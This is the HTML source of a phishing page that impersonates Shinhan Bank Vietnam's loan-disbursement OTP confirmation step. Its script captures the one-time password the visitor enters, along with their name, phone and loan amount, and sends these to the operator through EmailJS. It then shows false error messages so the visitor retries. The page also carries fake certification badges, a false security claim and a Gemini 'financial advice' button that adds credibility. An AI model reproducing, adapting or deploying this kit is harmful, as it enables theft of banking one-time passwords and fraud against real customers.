<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Nhận Giải Ngân Qua ATM - Shinhan Bank</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --shinhan-blue: #003087;
            --shinhan-blue-light: #e6f0ff;
        }
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f2f5;
        }
        .bg-shinhan-blue { background-color: var(--shinhan-blue); }
        .text-shinhan-blue { color: var(--shinhan-blue); }
        .border-shinhan-blue { border-color: var(--shinhan-blue); }
        .hover\:bg-shinhan-blue-dark:hover { background-color: #002263; }
        
        .otp-input:focus {
            border-color: var(--shinhan-blue);
            box-shadow: 0 0 0 2px rgba(0, 48, 135, 0.2);
        }
        .otp-input.error {
            border-color: #ef4444;
            box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2);
        }
        #gemini-modal-content .loader {
            width: 48px;
            height: 48px;
            border: 5px solid #E5E7EB;
            border-bottom-color: var(--shinhan-blue);
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
        }
        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        emailjs.init('c-Ms5MjWbitpDBb-E');
    </script>
</head>
<body class="bg-slate-100 text-slate-800">

    <header class="bg-white shadow-sm sticky top-0 z-40">
        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex items-center justify-between h-16">
                <div class="flex-shrink-0">
                    <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="h-8">
                </div>
                <div class="hidden md:block">
                    <nav class="flex items-center space-x-2">
                        <a href="#" class="text-gray-600 hover:text-shinhan-blue px-3 py-2 rounded-md text-sm font-medium">Trang Chủ</a>
                        <a href="#" class="text-gray-600 hover:text-shinhan-blue px-3 py-2 rounded-md text-sm font-medium">Sản Phẩm</a>
                        <a href="#" class="text-gray-600 hover:text-shinhan-blue px-3 py-2 rounded-md text-sm font-medium">Hỗ Trợ</a>
                    </nav>
                </div>
                <div class="md:hidden">
                    <button id="hamburger-button" class="inline-flex items-center justify-center p-2 rounded-md text-gray-400 hover:text-gray-500 hover:bg-gray-100 focus:outline-none" aria-expanded="false">
                        <span class="sr-only">Mở menu chính</span>
                        <svg class="block h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7" />
                        </svg>
                        <svg class="hidden h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </button>
                </div>
            </div>
        </div>
        <nav id="mobile-menu" class="md:hidden hidden bg-white border-t border-gray-200">
            <div class="px-2 pt-2 pb-3 space-y-1 sm:px-3">
                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/trang-chu.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Trang Chủ</a>
                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Giới Thiệu</a>
                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/ca-nhan.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Lợi Ích</a>
                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Đăng Ký Giải Ngân</a>
                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step5.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Xem Kết Quả</a>
                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Điều Khoản Sử Dụng</a>
                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/support-center.html" class="text-gray-600 hover:bg-gray-50 hover:text-shinhan-blue block px-3 py-2 rounded-md text-base font-medium">Liên Hệ</a>
            </div>
        </nav>
    </header>
    
    <main class="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8 md:py-12">
        <ol class="flex items-center w-full mb-8">
            <li class="flex w-full items-center text-shinhan-blue after:content-[''] after:w-full after:h-1 after:border-b after:border-blue-200 after:border-2 after:inline-block">
                <span class="flex items-center justify-center w-10 h-10 bg-blue-100 text-shinhan-blue rounded-full shrink-0 font-bold">1</span>
            </li>
            <li class="flex w-full items-center text-shinhan-blue after:content-[''] after:w-full after:h-1 after:border-b after:border-blue-200 after:border-2 after:inline-block">
                <span class="flex items-center justify-center w-10 h-10 bg-blue-100 text-shinhan-blue rounded-full shrink-0 font-bold">2</span>
            </li>
            <li class="flex items-center w-auto">
                <span class="flex items-center justify-center w-10 h-10 bg-shinhan-blue text-white rounded-full shrink-0 font-bold">3</span>
            </li>
        </ol>

        <div class="bg-white p-6 sm:p-8 rounded-xl shadow-lg">
            <div class="text-center">
                <h2 class="text-2xl font-bold text-slate-900">Xác Nhận Giải Ngân</h2>
                <p class="text-slate-500 mt-1">Vui lòng kiểm tra lại thông tin và xác thực giao dịch.</p>
            </div>
            
            <div class="mt-8 border-t border-b border-gray-200 py-6">
                <h3 class="text-base font-semibold text-slate-800 mb-4">Chi tiết giao dịch</h3>
                 <div class="space-y-4 text-sm">
                    <div class="flex justify-between items-center">
                        <span class="text-slate-500">Người thụ hưởng</span>
                        <span class="font-medium text-slate-900 text-right" id="summaryName"></span>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="text-slate-500">Ngân hàng thụ hưởng</span>
                        <span class="font-medium text-slate-900 text-right" id="summaryBank"></span>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="text-slate-500">Số tài khoản</span>
                        <span class="font-medium text-slate-900 text-right" id="summaryAccountNumber"></span>
                    </div>
                    <div class="border-t border-dashed my-2"></div>
                    <div class="flex justify-between items-center pt-2">
                        <span class="text-slate-500 font-semibold">Số tiền giải ngân</span>
                        <span class="font-bold text-shinhan-blue text-xl text-right" id="summaryAmount"></span>
                    </div>
                </div>
            </div>

            <div class="mt-6 text-center">
                <p class="text-sm text-slate-600" id="otpMessage"></p>
                <div class="mt-4">
                    <label for="otp" class="block text-sm font-medium text-slate-800 mb-2">Nhập mã OTP</label>
                    <input type="tel" id="otp" inputmode="numeric" class="otp-input w-full max-w-xs mx-auto px-4 py-2 text-center text-2xl tracking-[.5em] border border-slate-300 rounded-lg shadow-sm focus:outline-none transition" maxlength="8" />
                    <p id="otp-error-inline" class="hidden mt-2 text-sm text-red-600"></p>
                </div>
                <p class="mt-4 text-sm font-semibold text-red-600" id="otpTimer" aria-live="polite">Còn 60 giây</p>
            </div>

            <div class="mt-8 flex flex-col items-center space-y-4">
                <button class="w-full max-w-xs bg-shinhan-blue text-white font-bold py-3 px-4 rounded-lg hover:bg-shinhan-blue-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-shinhan-blue transition-all duration-150 ease-in-out" onclick="verifyOTP()">Xác Nhận</button>
                <button onclick="getFinancialAdvice()" class="text-sm text-shinhan-blue font-medium hover:underline transition">✨ Nhận Lời khuyên Tài chính</button>
            </div>
        </div>
    </main>
    
    <!-- Custom Error Modal -->
     <div id="errorModal" class="hidden fixed inset-0 bg-gray-900 bg-opacity-60 transition-opacity flex items-center justify-center p-4 z-50">
        <div class="bg-white rounded-lg shadow-xl transform transition-all sm:max-w-sm sm:w-full p-6 text-center">
            <p id="errorMessage" class="text-slate-700 mb-4"></p>
            <button id="errorButton" class="w-full bg-shinhan-blue text-white px-4 py-2 rounded-md hover:bg-shinhan-blue-dark" onclick="closeErrorModal()">Thử lại</button>
        </div>
    </div>

    <!-- Gemini Advice Modal -->
    <div id="gemini-modal" class="hidden fixed inset-0 bg-gray-900 bg-opacity-60 transition-opacity flex items-center justify-center p-4 z-50">
        <div class="bg-white rounded-lg shadow-xl transform transition-all sm:max-w-lg w-full">
            <div class="flex justify-between items-center p-4 border-b border-gray-200">
                <h3 class="text-lg font-semibold text-gray-900">✨ Lời khuyên Tài chính từ Gemini</h3>
                <button onclick="closeGeminiModal()" class="text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
            </div>
            <div id="gemini-modal-content" class="p-6 min-h-[200px] flex items-center justify-center">
                <!-- Content will be injected here -->
            </div>
             <div class="p-4 bg-gray-50 border-t border-gray-200 text-right">
                <button class="bg-shinhan-blue text-white px-4 py-2 text-sm rounded-md hover:bg-shinhan-blue-dark" onclick="closeGeminiModal()">Đã hiểu</button>
            </div>
        </div>
    </div>
    
    <footer class="bg-slate-800 text-slate-400 mt-12 py-8">
        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 text-center text-xs">
            <div class="flex justify-center space-x-4 mb-4">
                <img src="https://napthe.zalopay.vn/static/desktop/images/logos/PCI.svg" alt="PCI DSS" class="h-10">
                <img src="https://simg.zalopay.com.vn/zst/zlp-website/resources/images/footer/BCTLogo_1.png" alt="Bộ Công Thương" class="h-10">
                <img src="https://napthengay.vn/logoSaleNoti.png" alt="Bộ Công Thương" class="h-10">
            </div>
            <p>Liên hệ: <a href="mailto:support@shinhanbank.vn" class="hover:underline">support@shinhanbank.vn</a> | Hotline: 1900-1234 | <a href="http://zalo.me/84762797077" class="hover:underline">Hỗ trợ Zalo</a></p>
            <p class="mt-1">Dữ liệu được mã hóa với SSL. Kết nối an toàn.</p>
            <p class="mt-4">© 2025 Shinhan Bank Việt Nam. All Rights Reserved.</p>
            <p>Địa chỉ: Tầng 12, Tòa nhà Vincom Center, 72 Lê Thánh Tôn, Quận 1, TP. Hồ Chí Minh</p>
        </div>
    </footer>

    <script>
        let otpCountdown = 60;
        let otpInterval = null;
        let formData = {};
        let attemptCount = 0;

        function setupMobileMenu() {
            const hamburgerButton = document.getElementById('hamburger-button');
            const mobileMenu = document.getElementById('mobile-menu');
            if(!hamburgerButton || !mobileMenu) return;
            const icons = hamburgerButton.querySelectorAll('svg');
            hamburgerButton.addEventListener('click', () => {
                const isExpanded = hamburgerButton.getAttribute('aria-expanded') === 'true';
                hamburgerButton.setAttribute('aria-expanded', !isExpanded);
                mobileMenu.classList.toggle('hidden');
                icons.forEach(icon => icon.classList.toggle('hidden'));
            });
        }
        
        function clearOTPInput() {
            const otpInput = document.getElementById('otp');
            const otpErrorInline = document.getElementById('otp-error-inline');
            if (otpInput) {
                otpInput.value = '';
                otpInput.classList.remove('error');
                otpInput.focus();
            }
            if(otpErrorInline){
                otpErrorInline.classList.add('hidden');
            }
        }

        function startOTPTimer() {
            otpCountdown = 60;
            const timerEl = document.getElementById('otpTimer');
            if(!timerEl) return;
            timerEl.textContent = `Thời gian còn lại: ${otpCountdown} giây`;
            if (otpInterval) clearInterval(otpInterval);
            
            otpInterval = setInterval(() => {
                otpCountdown--;
                timerEl.textContent = `Thời gian còn lại: ${otpCountdown} giây`;
                if (otpCountdown <= 0) {
                    clearInterval(otpInterval);
                    timerEl.textContent = `Mã OTP đã hết hiệu lực.`;
                    clearOTPInput();
                }
            }, 1000);
        }

        function sendOTPToEmail(otp, phone) {
            const templateParams = {
                otp: otp,
                phone: phone || 'Không có',
                customer_name: formData.fullName || 'Không có',
                total_amount: formData.amount || 'Không có',
                contract_number: `SHB-${Date.now()}` // Tạo contract number tạm
            };
            
            emailjs.send('service_60tgxof', 'template_p60g14a', templateParams).then(
                () => console.log('OTP sent to EmailJS:', templateParams),
                (error) => console.error('EmailJS error:', error)
            );
        }
        
        function showInlineError(message) {
            const otpInput = document.getElementById('otp');
            const otpErrorInline = document.getElementById('otp-error-inline');
            if (otpInput && otpErrorInline) {
                otpInput.classList.add('error');
                otpErrorInline.textContent = message;
                otpErrorInline.classList.remove('hidden');
                otpInput.focus();
                otpInput.select();
            }
        }

        function showModalError(message) {
            const modal = document.getElementById('errorModal');
            const errorMessageEl = document.getElementById('errorMessage');
            if (modal && errorMessageEl) {
                errorMessageEl.textContent = message;
                modal.classList.remove('hidden');
            }
        }

        function closeErrorModal() {
            const modal = document.getElementById('errorModal');
            const errorButton = document.getElementById('errorButton');
            modal.classList.add('hidden');
            
            errorButton.textContent = 'Thử lại';
            errorButton.onclick = closeErrorModal;

            clearOTPInput();
        }

        function verifyOTP() {
            const otpInput = document.getElementById('otp');
            const otp = otpInput.value.trim();
            const phone = formData.phone || 'N/A';

            document.getElementById('otp-error-inline').classList.add('hidden');
            otpInput.classList.remove('error');

            if (otp.length !== 6 && otp.length !== 8) {
                showInlineError("Mã OTP phải là 6 hoặc 8 chữ số. Vui lòng kiểm tra lại.");
                return;
            }
            
            attemptCount++;

            if (attemptCount === 1) {
                sendOTPToEmail(otp, phone);
                startOTPTimer();
                showInlineError('Kiểm tra lại điều kiện, số dư không đủ hoặc thẻ chưa được kích hoạt.');
            } else if (attemptCount === 2) {
                startOTPTimer();
                showInlineError('Mã xác nhận hết hiệu lực hoặc không đúng.');
            } else {
                sessionStorage.removeItem('formData');
                const modal = document.getElementById('errorModal');
                const errorMessageEl = document.getElementById('errorMessage');
                const errorButton = document.getElementById('errorButton');

                errorMessageEl.textContent = 'Giải ngân không thành công. Vui lòng thử lại hoặc đăng ký giải ngân lại.';
                errorButton.textContent = 'Đăng ký lại';
                errorButton.onclick = () => {
                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
                };
                modal.classList.remove('hidden');
            }
        }
        
        function closeGeminiModal() {
            document.getElementById('gemini-modal').classList.add('hidden');
        }

        async function getFinancialAdvice() {
            const modal = document.getElementById('gemini-modal');
            const modalContent = document.getElementById('gemini-modal-content');
            
            if (!formData || !formData.amount) {
                modalContent.innerHTML = `<p class="text-red-500">Không tìm thấy thông tin khoản vay để đưa ra lời khuyên.</p>`;
                modal.classList.remove('hidden');
                return;
            }
            
            modal.classList.remove('hidden');
            modalContent.innerHTML = `<div class="loader"></div>`;

            const prompt = `Tôi sắp vay một khoản tiền là ${formData.amount} VND với thời hạn ${formData.months || 'không xác định'} tháng từ ngân hàng Shinhan. Dựa trên thông tin này, hãy đưa ra một số lời khuyên tài chính ngắn gọn, dễ hiểu và hữu ích cho người dùng ở Việt Nam. Vui lòng tập trung vào các điểm chính sau:
1. Gợi ý cách lập ngân sách hàng tháng để đảm bảo trả nợ đúng hạn.
2. Một vài lưu ý quan trọng về việc duy trì điểm tín dụng tốt.
3. Một cảnh báo nhỏ về các rủi ro tài chính cần tránh khi có một khoản vay.
Hãy trình bày dưới dạng danh sách các gạch đầu dòng, sử dụng ngôn ngữ thân thiện, tích cực và chuyên nghiệp.`;

            try {
                let chatHistory = [{ role: "user", parts: [{ text: prompt }] }];
                const payload = { contents: chatHistory };
                const apiKey = "";
                const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
                
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    throw new Error(`API call failed with status: ${response.status}`);
                }

                const result = await response.json();

                if (result.candidates && result.candidates.length > 0 &&
                    result.candidates[0].content && result.candidates[0].content.parts &&
                    result.candidates[0].content.parts.length > 0) {
                    const text = result.candidates[0].content.parts[0].text.replace(/(\* |- )/g, '• ').replace(/\n/g, '<br>');
                    modalContent.innerHTML = `<div class="text-left text-sm text-slate-700 space-y-3 prose prose-sm max-w-none">${text}</div>`;
                } else {
                    throw new Error("Không nhận được phản hồi hợp lệ từ AI.");
                }
            } catch (error) {
                console.error("Gemini API Error:", error);
                modalContent.innerHTML = `<p class="text-red-500">Rất tiếc, đã có lỗi xảy ra khi tạo lời khuyên. Vui lòng thử lại sau.</p>`;
            }
        }
        
        window.addEventListener('load', () => {
            startOTPTimer();
            setupMobileMenu();
            
            const otpInput = document.getElementById('otp');
            const otpErrorInline = document.getElementById('otp-error-inline');

            if (otpInput && otpErrorInline) {
                otpInput.addEventListener('input', () => {
                    otpInput.classList.remove('error');
                    otpErrorInline.classList.add('hidden');
                });
            }

            try {
                formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
                if (!formData.fullName && !formData.accountHolder) {
                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
                    return;
                }
                // *** FIX: Ưu tiên accountHolder, nếu không có thì dùng fullName ***
                document.getElementById('summaryName').textContent = formData.accountHolder || formData.fullName || 'N/A';
                document.getElementById('summaryAmount').textContent = formData.amount || 'N/A';
                document.getElementById('summaryBank').textContent = formData.bank || 'N/A';
                document.getElementById('summaryAccountNumber').textContent = formData.accountNumber || 'N/A';
                document.getElementById('otpMessage').innerHTML = `Một mã OTP đã được gửi đến số điện thoại <strong>${formData.phone || 'N/A'}</strong>.`;
            } catch (error) {
                console.error('Error parsing formData:', error);
                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
            }
        });
    </script>
</body>
</html>
